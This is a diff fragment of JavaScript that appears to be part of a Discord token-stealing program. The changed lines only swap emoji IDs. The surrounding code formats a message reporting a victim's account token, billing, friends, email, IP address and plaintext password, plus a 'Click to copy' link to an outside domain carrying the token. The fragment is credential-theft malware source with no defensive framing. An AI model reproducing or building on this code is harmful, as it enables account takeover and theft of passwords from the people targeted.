@@ -610,7 +610,7 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:944007295417843743:959785231982931979> Token:',
+            name: '<a:959785231982931979:997448270769049660> Token:',
             value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
             inline: false,
           },
@@ -620,27 +620,27 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Billing:',
+            name: '<:959785232037470208:997448269468807209> Billing:',
             value: `**${billing}**`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Friends:',
+            name: '<:959785231999721472:997448268172754964> Friends:',
             value: `\`${friends}\``,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Email:',
+            name: '<:959785232037470208:997448269468807209> Email:',
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> IP:',
+            name: '<a:846706207632261120:997448266725728336> IP:',
             value: `\`${config.ip}\``,
             inline: true,
           },
           {
-            name: '<a:satan:846706207632261120> Password:',
+            name: '<a:846706207632261120:997448266725728336> Password:',
             value: `\`${password}\``,
             inline: true,
           },
